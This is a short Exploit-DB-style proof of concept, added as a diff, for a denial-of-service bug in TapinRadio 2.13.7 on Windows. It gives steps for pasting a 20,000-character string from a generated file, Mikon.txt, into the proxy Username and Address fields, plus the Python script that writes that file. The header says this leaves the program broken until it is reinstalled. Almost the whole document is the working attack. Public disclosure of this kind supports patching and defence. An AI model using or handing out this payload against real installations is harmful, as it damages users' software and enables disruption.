@@ -1,0 +1,30 @@
+# Exploit Title: TapinRadio 2.13.7 - Denial of Service (PoC)
+# Date: 2020-05-12
+# Exploit Author: Ismael Nava
+# Vendor Homepage: http://www.raimersoft.com/
+# Software Link: www.raimersoft.com/downloads/tapinradio_setup_x64.exe
+# Version: 2.13.7 x64
+# Tested on: Windows 10 Home x64
+
+#STEPS
+# Open the program TapinRadio 
+# In Settings select Preferences option
+# Click in Miscellaneous and click in Set Application Proxy
+# Run the python exploit script, it will create a new .txt files
+# Copy the content of the file "Mikon.txt"
+# Paste the content in the field Username and Address and click in OK
+# Click in Ok again
+# After TapinRadio closed, the program did not work again if the user try to open again, so it is necessary uninstall and install again
+# End :)
+
+
+buffer = 'K' * 20000
+
+try: 
+    file = open("Mikon.txt","w")
+    file.write(buffer)
+    file.close()
+
+    print("Archive ready")
+except:
+    print("Archive no ready")
